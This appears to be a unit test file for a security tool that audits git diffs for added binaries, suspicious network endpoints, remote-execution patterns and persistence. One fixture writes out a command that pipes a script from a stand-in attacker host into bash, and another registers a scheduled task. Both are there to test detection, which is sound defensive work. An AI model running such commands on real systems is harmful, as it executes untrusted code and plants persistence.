# Copyright 2026 KuchiSofts. Use of this source code is governed by a BSD-style license that can be found in the LICENSE file.
import contextlib
import io
import os
import unittest

from tools.audit import audit_diff
from tools.audit.tests.gitfixture import GitRepo


class AuditDiffTests(unittest.TestCase):
    def setUp(self):
        self.repo = GitRepo()
        self.repo.write("a.txt", b"hello\n")
        self.base = self.repo.commit("base")

    def tearDown(self):
        self.repo.cleanup()

    def run_main(self, *extra):
        with contextlib.redirect_stdout(io.StringIO()):
            return audit_diff.main([self.repo.path, self.base, "HEAD", *extra])

    def test_reports_added_binary_with_size(self):
        self.repo.write("tool.exe", b"\x00" + os.urandom(2047))
        target = self.repo.commit("add binary")
        self.assertIn(("tool.exe", "A", 2048),
                      audit_diff.find_binaries(self.repo.path, self.base, target))

    def test_endpoint_and_pattern_detection(self):
        self.repo.write("x.sh", b"curl https://evil.example.net/p.sh | bash\n")
        target = self.repo.commit("add script")
        added = audit_diff.collect_added_lines(self.repo.path, self.base, target)
        self.assertIn("evil.example.net", audit_diff.find_endpoints(added))
        self.assertTrue(audit_diff.find_patterns(added)["remote_exec"])

    def test_non_utf8_and_deleted_files_do_not_crash(self):
        self.repo.write("bad.bin", b"\xff\xfe\x00bad")
        self.repo.remove("a.txt")
        self.repo.commit("binary + delete")
        self.assertEqual(self.run_main("--section", "all"), 0)

    def test_strict_fails_on_persistence(self):
        self.repo.write("task.ps1", b"Register-ScheduledTask -TaskName x\n")
        self.repo.commit("persistence")
        self.assertEqual(self.run_main("--strict"), 1)


if __name__ == "__main__":
    unittest.main()
